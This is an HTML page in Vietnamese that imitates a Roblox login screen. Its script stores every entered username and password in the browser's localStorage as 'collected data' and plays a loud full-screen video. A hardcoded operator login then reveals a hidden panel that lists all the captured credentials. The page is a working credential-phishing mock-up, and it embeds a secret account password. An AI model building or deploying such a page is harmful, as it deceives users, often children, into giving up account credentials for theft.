<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; }
        #nav { position: absolute; top: 10px; left: 10px; font-size: 14px; cursor: pointer; color: #aaa; display: none; border: 1px solid #444; padding: 5px; }
        .container { width: 90%; max-width: 350px; margin: 100px auto; text-align: center; }
        input { width: 100%; padding: 12px; margin: 8px 0; background: #222; border: none; color: #fff; border-radius: 5px; }
        button { width: 100%; padding: 12px; margin: 8px 0; background: #0084ff; border: none; color: #fff; font-weight: bold; cursor: pointer; }
        #homeArea { display: none; padding: 20px; text-align: left; }
        #vidOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; }
        .log-item { background: #111; padding: 10px; margin: 5px 0; border: 1px solid #333; }
    </style>
</head>
<body>

<div id="nav" onclick="showHome()">Home</div>

<div class="container" id="loginForm">
    <h2>ROBLOX</h2>
    <input type="text" id="user" placeholder="Tên người dùng">
    <input type="password" id="pass" placeholder="Mật khẩu">
    <button onclick="executeLogin()">Đăng nhập</button>
</div>

<div id="homeArea" class="container">
    <h3>Dữ liệu đã thu thập:</h3>
    <div id="dataList"></div>
</div>

<div id="vidOverlay">
    <video id="vid" width="100%" height="100%" loop>
        <source src="video.mp4" type="video/mp4">
    </video>
</div>

<script>
    function executeLogin() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        
        // Thu thập và lưu vào mảng dữ liệu
        let logs = JSON.parse(localStorage.getItem('all_logs') || '[]');
        logs.push({user: u, pass: p});
        localStorage.setItem('all_logs', JSON.stringify(logs));
        
        // Kích hoạt video
        document.getElementById('vidOverlay').style.display = 'block';
        const v = document.getElementById('vid');
        v.volume = 1.0;
        v.play();

        if(u === "gg3636" && p === "36thanhhoa") {
            document.getElementById('nav').style.display = 'block';
        }
    }

    function showHome() {
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('vidOverlay').style.display = 'none';
        document.getElementById('homeArea').style.display = 'block';
        
        let logs = JSON.parse(localStorage.getItem('all_logs') || '[]');
        let html = '';
        logs.forEach(item => {
            html += `<div class="log-item">Tên: ${item.user} | MK: ${item.pass}</div>`;
        });
        document.getElementById('dataList').innerHTML = html;
    }
</script>
</body>
</html>
